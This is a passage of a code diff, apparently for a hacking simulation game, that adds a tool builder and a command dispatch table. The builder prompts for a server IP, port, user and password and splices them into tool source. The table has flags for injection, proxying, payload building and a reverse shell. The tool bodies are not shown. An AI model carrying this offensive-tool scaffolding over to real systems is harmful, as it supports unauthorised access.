+    unlock=function;runBuild("p="""+arg.p+""";c=host_computer(get_shell);t=File(c,"""+arg.s+""")"+tools["unlock"],"unlock");end function
+    xchat=function
+      _ip=user_input("Server IP: ")
+      if not _ip then return Error.set("No IP provided")
+      _pt=user_input("Port (22): ")
+      if not _pt then _pt="22"
+      _us=user_input("User (root): ")
+      if not _us then _us="root"
+      _pw=user_input("Password: ",true)
+      runBuild("ip="""+_ip+""";pt="""+_pt+""";us="""+_us+""";pw="""+_pw+""";"+tools["xchat"],"xchat")
+    end function
+    xviewer=function
+      _ip=user_input("Server IP: ")
+      if not _ip then return Error.set("No IP provided")
+      _pt=user_input("Port (22): ")
+      if not _pt then _pt="22"
+      _us=user_input("User (root): ")
+      if not _us then _us="root"
+      _pw=user_input("Password: ",true)
+      runBuild("ip="""+_ip+""";pt="""+_pt+""";us="""+_us+""";pw="""+_pw+""";"+tools["xviewer"],"xviewer")
+    end function
+    // Special tools with custom logic
+    a={
+      "lock":@lock,
+      "unlock":@unlock,
+      "xchat":@xchat,
+      "xviewer":@xviewer
+    }
+    if hasIndex(a,Arg1) then return a[Arg1]
+    // Any other tool present in payload/src/tools uses the generic builder
+    return buildTool(Arg1)
+  end function
+  // Peek at source code for binary or tool
+  peek=function(args)
+    if not args then return Error.set("No bin name supplied")
+    binaryName=lower(args[-1])
+    allSources=bins+tools+hideTemplates
+    if not hasIndex(allSources,binaryName) then return Warning.set("Bad bin name [ "+binaryName+" ]")
+    listNH(split(allSources[binaryName],";"))
+  end function
+  // Command dispatch table
+  commands={
+    "-p":@peek,
+    "-cs":@serverFront,
+    "-a":@defaultBins,
+    "-i":@inject,
+    "-pm":@proxyMap,
+    "-pp":@proxyPDat,
+    "-pc":@manualProxy,
+    "-b":@doBuild,
+    "-l":@buildable,
+    "-v":@viewSource,
+    "-rec":@buildRecovery,
+    "-r":@rshell,
+    "-t":@standalone
+  }
+  // Validate and execute command
+  if not hasIndex(commands,mode) then return Warning.set("No flag supplied")
+  commands[mode](argv[1:])
+end function
